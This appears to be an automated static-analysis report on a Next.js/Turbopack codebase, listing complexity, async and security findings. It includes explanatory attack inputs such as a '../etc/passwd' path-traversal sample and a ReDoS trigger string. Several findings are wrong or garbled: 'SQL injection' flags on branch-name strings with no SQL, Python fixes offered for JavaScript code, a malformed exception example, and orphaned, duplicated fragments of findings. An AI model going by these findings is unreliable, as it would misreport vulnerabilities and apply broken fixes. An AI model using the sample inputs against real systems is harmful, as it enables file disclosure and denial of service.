findings.title: Blocking call `readFileSync` in async function
findings.description:
[COMPOUND: 2 co-located issues] Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `requestListener`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: Architectural Bottleneck: cache (architectural hub)
findings.description:
[COMPOUND: 2 co-located issues] Function 'cache' is called by 27 functions and has complexity 184. Changes here are high-risk.

Betweenness centrality: 0.0615 - this function sits on many execution paths between other functions.

📊 Threshold: 20 (adaptive) | Actual: 184 | Default would be: 20 | Profile: p90=9, p95=15, mean=4.4, n=23362
findings.suggested_fix: This is a critical hub. Ensure comprehensive test coverage, add defensive error handling, and consider circuit breaker pattern.
findings.why_it_matters: Bottlenecks are single points of failure that amplify bugs. High fan-in with high complexity means many callers depend on risky code.

findings.title: Mutual recursion: 2 functions in call cycle (complexity 186)
findings.description: [COMPOUND: 2 co-located issues] Mutual recursion detected: 2 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/use-cache/use-cache-wrapper.ts::cache:1084 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/packages/next/src/server/use-cache/use-cache-wrapper.ts::wrapAsInvalidDynamicUsageError:1104. Aggregate complexity: 186.
findings.suggested_fix: Consider refactoring to eliminate direct mutual calls. Common strategies: merge the two functions, use a callback parameter, or introduce a shared data structure that both functions operate on.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: God class detected: NextURL
findings.description:
Class 'NextURL' shows signs of being a god class: very high method count (38).

**Role Analysis:** Application — Standard application class

**Metrics:**
- Methods: 38
- Total complexity: 1
- Lines of code: 250

📊 Threshold: 20 (adaptive) | Actual: 38 | Default would be: 20 | Profile: p90=1, p95=3, mean=0.5, n=5030
findings.suggested_fix:
Refactor 'NextURL' to reduce its responsibilities:
**Note:** This class was identified as Application (Standard application class). Thresholds adjusted accordingly.

1. **Extract related methods into separate classes**
- Look for method groups that work with the same data
- Create focused classes with single responsibilities

**Apply SOLID principles:**
- Single Responsibility: Each class should have one reason to change
- Open/Closed: Extend behavior without modifying existing code
- Interface Segregation: Create specific interfaces
- Dependency Inversion: Depend on abstractions
findings.why_it_matters: God classes violate the Single Responsibility Principle. They are difficult to understand, test, and maintain. Changes to one part may unexpectedly affect other parts, leading to bugs and technical debt.

findings.title: Blocking call `readFileSync` in async function
findings.description:
Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `getModuleContext`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: Hook called conditionally: `useHtmlContext`
findings.description:
React hooks must be called in the exact same order on every render.

**Analysis:**
🪝 Hook: `useHtmlContext`
⚠️ Called inside `if/else/switch/ternary`
findings.why_it_matters:
This violates the Rules of Hooks. React relies on the order of hook calls to track state correctly. Conditional/loop/nested hooks cause:
• State getting out of sync
• Crashes and rendering bugs
• Unpredictable behavior

findings.title: Global mutable variable: path
findings.description:
Global mutable state 'path' makes code hard to reason about.

**Impact Analysis:**
📊 Used 6 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getPath()`, `setPath()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

findings.title: Prototype pollution: Object.assign merge
findings.description:
Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: Object.assign merge
🌐 Function receives external data via route handler
📦 In function: `buildCancellationError` (2 callers)
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

Async function called without await - returns Promise/coroutine, not the actual value.

**Analysis:**
📦 In async function: `ncc_stream_browserify`
🔍 Calls a function defined as async in this codebase
findings.suggested_fix: Add `await` before the async call.
findings.why_it_matters: Without await, you get a Promise object instead of the actual result.

Async function called without await - returns Promise/coroutine, not the actual value.

**Analysis:**
📦 In async function: `next_devtools_shared_esm`
🔍 Calls a function defined as async in this codebase
findings.suggested_fix: Add `await` before the async call.
findings.why_it_matters: Without await, you get a Promise object instead of the actual result.

findings.title: XSS: React dangerouslySetInnerHTML
findings.description:
**dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: packages/third-parties/src/ThirdPartyScriptEmbed.tsx:45

**Code snippet**:
```
dangerouslySetInnerHTML={{ __html: html }}
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: unsafe block without SAFETY comment
findings.description: Unsafe blocks should document why they're safe. Add a `// SAFETY:` comment.
findings.why_it_matters: Unsafe code bypasses Rust's safety guarantees. SAFETY comments are essential for code review.

findings.title: Empty catch block swallows exceptions
findings.description:
[COMPOUND: 2 co-located issues] This catch block silently swallows exceptions, hiding potential bugs.

**Risk Assessment:**
⚠️ `loadEnvFile` appears to do I/O
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Test code in production: 3 issues
findings.description:
[COMPOUND: 2 co-located issues] Test utilities and patterns found in what appears to be production code.

**Found:**
• Test fixtures (lines 36, 102, 133)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Callback hell (6 levels deep)
findings.description:
Deeply nested callbacks (6 levels) make code hard to follow.

**Analysis:**
✓ File already uses async/await in some places
⚠️ 6 .then() chains detected
findings.suggested_fix:
This file already uses async/await. Convert remaining callbacks:
1. Replace `.then()` chains with `await`
2. Use `try/catch` instead of `.catch()`
findings.why_it_matters: The 'pyramid of doom' hurts readability and makes error handling difficult. Each nesting level increases cognitive load.

findings.title: Empty catch block swallows exceptions
findings.description:
This catch block silently swallows exceptions, hiding potential bugs.

**Risk Assessment:**
⚠️ `readdirSync` appears to do I/O
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Empty catch block swallows exceptions
findings.description:
This catch block silently swallows exceptions, hiding potential bugs.

**Risk Assessment:**
⚠️ `readyFile` appears to do I/O
findings.suggested_fix:
This swallows I/O or network exceptions - very dangerous!
At minimum, log the exception:
```python
except Exception as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbo-persistence/src/db.rs::impl<TurboPersistence<S, FAMILIES>>::load_directory:289 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbo-persistence/src/db.rs::impl<TurboPersistence<S, FAMILIES>>::open:161 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbo-persistence/src/db.rs::impl<TurboPersistence<S, FAMILIES>>::open_directory:247 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbo-persistence/src/db.rs::impl<TurboPersistence<S, FAMILIES>>::open_with_config_and_parallel_scheduler:224 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbo-persistence/src/db.rs::impl<TurboPersistence<S, FAMILIES>>::open_with_parallel_scheduler:219. findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.

findings.title: God class detected: Backend
findings.description:
Class 'Backend' shows signs of being a god class: very high method count (30).

**Role Analysis:** Application — Standard application class

**Metrics:**
- Methods: 30
- Total complexity: 1
- Lines of code: 180

📊 Threshold: 20 (adaptive) | Actual: 30 | Default would be: 20 | Profile: p90=1, p95=3, mean=0.5, n=5030
findings.suggested_fix:
Refactor 'Backend' to reduce its responsibilities:
**Note:** This class was identified as Application (Standard application class). Thresholds adjusted accordingly.

1. **Extract related methods into separate classes**
- Look for method groups that work with the same data
- Create focused classes with single responsibilities

**Apply SOLID principles:**
- Single Responsibility: Each class should have one reason to change
- Open/Closed: Extend behavior without modifying existing code
- Interface Segregation: Create specific interfaces
- Dependency Inversion: Depend on abstractions
findings.why_it_matters: God classes violate the Single Responsibility Principle. They are difficult to understand, test, and maintain. Changes to one part may unexpectedly affect other parts, leading to bugs and technical debt.

Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbopack-core/src/resolve/mod.rs::apply_in_package:2618 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbopack-core/src/resolve/mod.rs::find_self_reference:2737 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbopack-core/src/resolve/mod.rs::get_matching_before_resolve_plugins:1744 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbopack-core/src/resolve/mod.rs::handle_after_resolve_plugins:1777 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbopack-core/src/resolve/mod.rs::handle_before_resolve_plugins:1759 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/turbopack/crates/turbopack-core/src/resolve/mod.rs::handle_exports_imports_field:3194 ... findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Prototype pollution: Object.assign merge
findings.description:
Object merge/extend operation with user-controlled input can pollute Object.prototype.

**Analysis:**
🔍 Pattern: Object.assign merge
🌐 Function receives external data via route handler
📦 In function: `wrapDeps` (1 callers)
findings.why_it_matters:
Prototype pollution allows attackers to inject properties into Object.prototype, which affects ALL objects in the application. This can lead to:
• Remote Code Execution (via gadget chains)
• Denial of Service
• Authentication bypass
• Property injection

findings.title: Test code in production: 4 issues
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Test code (lines 7, 8, 9, 42)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Long method: ImportChain (412 lines)
findings.description:
Function 'ImportChain' has 412 lines (effective threshold: 150).

**Graph Analysis:**
Calls 5 different modules - possible split points
findings.suggested_fix:
This function calls 5 different modules. Consider extracting:
  - `handle_lib()` for lib operations
  - `handle_custom-cache-handler-image()` for custom-cache-handler-image operations
  - `handle_analyzer()` for analyzer operations
findings.why_it_matters: Long methods are hard to understand, test, and maintain. Each function should do one thing well.

findings.title: Hidden regex in loop: drawTreemap
findings.description:
[COMPOUND: 2 co-located issues] Function 'drawTreemap' contains a loop and calls 'drawTreemap' which compiles a regex.

**Call chain:** drawTreemap → formatBytes → toFixed

This may cause regex compilation on every iteration.
findings.suggested_fix:
Options:
1. Cache the compiled regex (lazy_static, OnceLock)
2. Pass pre-compiled regex as parameter
3. Restructure to compile once before loop
findings.why_it_matters: Hidden regex compilation across function boundaries is harder to spot but equally impactful.

findings.title: Hidden regex in loop: TreemapVisualizer
findings.description:
[COMPOUND: 2 co-located issues] Function 'TreemapVisualizer' contains a loop and calls 'drawTreemap' which compiles a regex.

**Call chain:** drawTreemap → formatBytes → toFixed

This may cause regex compilation on every iteration.
findings.suggested_fix:
Options:
1. Cache the compiled regex (lazy_static, OnceLock)
2. Pass pre-compiled regex as parameter
3. Restructure to compile once before loop
findings.why_it_matters: Hidden regex compilation across function boundaries is harder to spot but equally impactful.

findings.title: Hidden regex in loop: printProfileAnalysis
findings.description:
Function 'printProfileAnalysis' contains a loop and calls 'toMs' which compiles a regex.

**Call chain:** toMs → toFixed

This may cause regex compilation on every iteration.
findings.suggested_fix:
Options:
1. Cache the compiled regex (lazy_static, OnceLock)
2. Pass pre-compiled regex as parameter
3. Restructure to compile once before loop
findings.why_it_matters: Hidden regex compilation across function boundaries is harder to spot but equally impactful.

findings.title: Global mutable variable: progress
findings.description:
Global mutable state 'progress' makes code hard to reason about.

**Impact Analysis:**
📊 Used 3 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getProgress()`, `setProgress()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

findings.title: Mutual recursion: 3 functions in call cycle (complexity 22)
findings.description: Mutual recursion detected: 3 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/crates/next-api/src/routes_hashes_manifest.rs::impl<Asset for RoutesHashesManifestAsset>::content:206 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/crates/next-api/src/routes_hashes_manifest.rs::outputs_hash:69 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/next.js/crates/next-api/src/routes_hashes_manifest.rs::sources_hash:139. Aggregate complexity: 22.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: High panic density in `main`: 12 panic-family calls
findings.description: [COMPOUND: 3 co-located issues] Function `main` contains 12 calls to `.unwrap()`, `.expect()`, or `panic!()` at line 47, line 55, line 60, line 65, line 97, line 121, line 123, line 127, line 154, line 158, line 160, line 194. This makes the function fragile and likely to panic at runtime.
findings.suggested_fix:
Reduce panic points by:
- Using `?` operator for error propagation
- Using `unwrap_or` / `unwrap_or_default` / `unwrap_or_else`
- Returning `Result<T, E>` instead of panicking
- Extracting fallible logic into a helper that returns Result
findings.why_it_matters: Functions with many panic points are fragile. A single unexpected None/Err will crash the program. Consolidating error handling makes code more robust and easier to reason about.

findings.title: Long method: get_server_module_options_context (575 lines)

Orchestrator pattern: calls 32 functions (reduced severity)

findings.suggested_fix:
This appears to be an orchestrator function (coordinates many calls).

findings.title: Mutex poisoning risk
findings.description: [COMPOUND: 2 co-located issues] Using .lock().unwrap() will panic if the mutex is poisoned. Consider handling the PoisonError or using parking_lot::Mutex.
findings.suggested_fix:
Handle poisoning: `mutex.lock().unwrap_or_else(|e| e.into_inner())`
Or use `parking_lot::Mutex` which has no poisoning.
findings.why_it_matters: Poisoned mutexes cause cascading panics across threads.

findings.title: Test code in production: 5 issues
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Test assertions (lines 21, 27, 28, 75, 106)
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: Test code in production files adds confusion and potential bloat. It may be accidentally executed or cause import errors in environments without test dependencies.

findings.title: Test code in production: 1 issue
findings.description:
[COMPOUND: 2 co-located issues] Test utilities and patterns found in what appears to be production code.

**Found:**
• Test assertions (line 82)
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:

findings.title: Empty catch block swallows exceptions

findings.title: String concatenation in loop
findings.description:
Variable 'configText' concatenated 2 times inside loop (started line 33).

**Performance:** O(n²) time complexity. Each concatenation creates a new string and copies all previous characters.

For 1000 iterations, this copies ~500,000 characters instead of 1000.
findings.why_it_matters: String concatenation in loops creates O(n²) time complexity due to immutable string copying.

findings.title: Hidden regex in loop: run
findings.description:
Function 'run' contains a loop and calls 'writePlugins' which compiles a regex.

**Call chain:** writePlugins → getPluginList → getItems

This may cause regex compilation on every iteration.
findings.suggested_fix:
Options:
1. Cache the compiled regex (lazy_static, OnceLock)
2. Pass pre-compiled regex as parameter
3. Restructure to compile once before loop
findings.why_it_matters: Hidden regex compilation across function boundaries is harder to spot but equally impactful.

findings.title: Potential ReDoS vulnerability
findings.description:
Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers detected
📝 Pattern: `^((?:[\w-]+\`
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: Hidden regex in loop: getItems
findings.description:
Function 'getItems' contains a loop and calls 'getItems' which compiles a regex.

**Call chain:** getItems → getItems

This may cause regex compilation on every iteration.
findings.suggested_fix:
Options:
1. Cache the compiled regex (lazy_static, OnceLock)
2. Pass pre-compiled regex as parameter
3. Restructure to compile once before loop
findings.why_it_matters: Hidden regex compilation across function boundaries is harder to spot but equally impactful.

Example:

except (Error (check error.code for ENOENT, EACCES)) as e:
logger.error(f"Operation failed: {e}")

findings.title: Empty catch block swallows exceptions
findings.description: This catch block silently swallows exceptions, hiding potential bugs.
findings.suggested_fix:
Log the exception or handle it appropriately:
- Add logging to track failures
- Re-raise if recovery isn't possible
- Handle specific exception types
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

```
findings.why_it_matters: Broad exception catches mask unexpected errors like TypeErrors or AttributeErrors that indicate bugs in your code.

findings.title: Circular dependency: 3 files
findings.description:
[COMPOUND: 2 co-located issues] Mutual dependency between: create-compiler-aliases.ts ↔ handle-externals.ts ↔ webpack-config.ts

**Weakest link to break:** `create-compiler-aliases.ts` → `handle-externals.ts` (1 import)
findings.suggested_fix:
🔗 **Best place to break:** `create-compiler-aliases.ts` → `handle-externals.ts` (weakest coupling: 1 imports)

Since `create-compiler-aliases.ts` only imports 1 symbol(s) from `handle-externals.ts`, consider:
- Move those symbols to a shared module
- Pass them as parameters instead of importing
- Use dependency injection

**For small cycles:**
1. Merge tightly coupled modules if they're always used together
2. Use TYPE_CHECKING (Python) or type-only imports (TS) for type hints
3. Extract common code to a third module
findings.why_it_matters: Circular dependencies make code harder to understand, test, and maintain. They can cause import errors at runtime and make it difficult to refactor individual modules.

findings.title: Regex compiled inside loop
findings.description:
Regex compiled in loop (loop starts line 852).

**Performance impact:** Regex compilation is expensive. In a loop of N iterations, this costs N compilations instead of 1.
findings.suggested_fix:
Move regex compilation outside the loop:
```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

findings.title: Empty catch block swallows exceptions
findings.description: This catch block silently swallows exceptions, hiding potential bugs.
findings.suggested_fix:
Log the exception or handle it appropriately:
- Add logging to track failures
- Re-raise if recovery isn't possible
- Handle specific exception types
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Regex compiled inside loop
findings.description:
Regex compiled in loop (loop starts line 73).

**Performance impact:** Regex compilation is expensive. In a loop of N iterations, this costs N compilations instead of 1.
findings.suggested_fix:
Move regex compilation outside the loop:
```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

findings.title: Potential ReDoS vulnerability
findings.description:
[COMPOUND: 2 co-located issues] Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers detected
📝 Pattern: `^(?:\`
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: String concatenation in loop
findings.description:
Variable 'main' concatenated 17 times inside loop (started line 87).

**Performance:** O(n²) time complexity. Each concatenation creates a new string and copies all previous characters.

For 1000 iterations, this copies ~500,000 characters instead of 1000.
findings.why_it_matters: String concatenation in loops creates O(n²) time complexity due to immutable string copying.

findings.title: JWT using symmetric algorithm (HS256)
findings.description:
HS256 uses a shared secret. If the secret is weak or leaked, attackers can forge tokens. Consider RS256/ES256.

**Context:**
📦 In function: `setPreviewData` (5 callers)
findings.suggested_fix:
Consider using asymmetric algorithms:

```python
# RS256 (RSA) or ES256 (ECDSA) recommended
jwt.encode(payload, private_key, algorithm='RS256')

# If using HS256, ensure secret is:
# - At least 256 bits (32 bytes)
# - Cryptographically random
# - Never hardcoded
```
findings.why_it_matters: JWT vulnerabilities can allow attackers to forge authentication tokens, impersonate users, escalate privileges, or bypass authorization entirely.

findings.title: Excessive nesting: 10 levels in afterCompile
findings.description:
10 levels of nesting (threshold: 6).

**Analysis:**
In function: `afterCompile`
High complexity: 30 (nesting compounds this)

Threshold: 5 (adaptive) | Actual: 10 | Default would be: 5 | Profile: p90=3, p95=4, mean=1.4, n=23362
findings.suggested_fix:
Severely nested code. Apply multiple techniques:
1. Guard clauses: `if (!condition) return;`
2. Extract Method: pull nested blocks into functions
3. Replace conditionals with polymorphism
4. Use functional patterns (map/filter instead of nested loops)
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Excessive nesting: 10 levels
findings.description:
10 levels of nesting (threshold: 6).

Threshold: 5 (adaptive) | Actual: 10 | Default would be: 5 | Profile: p90=3, p95=4, mean=1.4, n=23362
findings.suggested_fix:
Severely nested code. Apply multiple techniques:
1. Guard clauses: `if (!condition) return;`
2. Extract Method: pull nested blocks into functions
3. Replace conditionals with polymorphism
4. Use functional patterns (map/filter instead of nested loops)
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Regex compiled inside loop
findings.description:
Regex compiled in loop (loop starts line 1051).

**Performance impact:** Regex compilation is expensive. In a loop of N iterations, this costs N compilations instead of 1.
findings.suggested_fix:
Move regex compilation outside the loop:
```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

findings.title: String concatenation in loop
findings.description:
Variable 'result' concatenated 2 times inside loop (started line 15).

**Performance:** O(n²) time complexity. Each concatenation creates a new string and copies all previous characters.

For 1000 iterations, this copies ~500,000 characters instead of 1000.
findings.why_it_matters: String concatenation in loops creates O(n²) time complexity due to immutable string copying.

findings.title: Architectural Bottleneck: connection (utility function - expected high fan-in)

findings.title: Broad exception catch
findings.description:
Catching generic Exception hides bugs and makes debugging difficult.

**Analysis:**
📞 Try block calls: log, readFileSync, warn, parse, existsSync
findings.suggested_fix:
Based on the operations in your try block, consider catching:
  • Error (check error.code for ENOENT, EACCES)
  • SyntaxError (for JSON.parse)

Example:
```python
except (Error (check error.code for ENOENT, EACCES)) as e:
logger.error(f"Operation failed: {e}")
```
findings.why_it_matters: Broad exception catches mask unexpected errors like TypeErrors or AttributeErrors that indicate bugs in your code.

findings.title: Potential SQL Injection (CWE-89)
findings.description:
[Non-production path] **Potential SQL Injection Vulnerability**

**Pattern detected**: JavaScript template literal with interpolation in SQL query

**Location**: scripts/automated-update-workflow.js:26

**Code snippet**:
```javascript
const branchName = `update/${BRANCH_NAME}-${Date.now()}`
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.title: Loose equality (==) used
findings.description:
== performs type coercion which can cause subtle bugs.

**Analysis:**
📦 In function: `getWorkflowRuns` (1 callers)
🌐 Route handler (processes user input)
findings.why_it_matters:
Type coercion in == can cause unexpected behavior:
• '1' == 1 is true
• '' == false is true
• [] == false is true
Use === to compare both value AND type.

findings.title: High panic density in `main`: 6 panic-family calls
findings.description: Function `main` contains 6 calls to `.unwrap()`, `.expect()`, or `panic!()` at line 67, line 76, line 81, line 84, line 90, line 105. This makes the function fragile and likely to panic at runtime.
findings.suggested_fix:
Reduce panic points by:
- Using `?` operator for error propagation
- Using `unwrap_or` / `unwrap_or_default` / `unwrap_or_else`
- Returning `Result<T, E>` instead of panicking
- Extracting fallible logic into a helper that returns Result
findings.why_it_matters: Functions with many panic points are fragile. A single unexpected None/Err will crash the program. Consolidating error handling makes code more robust and easier to reason about.

findings.title: Potential SQL Injection (CWE-89)
findings.description:
[Non-production path] **Potential SQL Injection Vulnerability**

**Pattern detected**: JavaScript template literal with interpolation in SQL query

**Location**: scripts/sync-react.js:397

**Code snippet**:
```javascript
: `update/react/${newVersionStr}`
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.title: String concatenation in loop
findings.description:
Variable 'prDescription' concatenated 4 times inside loop (started line 523).

**Performance:** O(n²) time complexity. Each concatenation creates a new string and copies all previous characters.

For 1000 iterations, this copies ~500,000 characters instead of 1000.
findings.why_it_matters: String concatenation in loops creates O(n²) time complexity due to immutable string copying.

findings.title: Empty catch block swallows exceptions
findings.description: This catch block silently swallows exceptions, hiding potential bugs.
findings.suggested_fix:
Log the exception or handle it appropriately:
- Add logging to track failures
- Re-raise if recovery isn't possible
- Handle specific exception types
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Path traversal via path.join with user input
findings.description: [Non-production path] path.join() with user input does NOT prevent path traversal. Joining '/base' with '../etc/passwd' results in '/etc/passwd'.
findings.why_it_matters: path.join() is commonly misunderstood as safe, but it preserves '../' sequences allowing directory escape.

findings.title: Global mutable variable: i
findings.description:
Global mutable state 'i' makes code hard to reason about.

**Impact Analysis:**
📊 Used 2 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getI()`, `setI()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
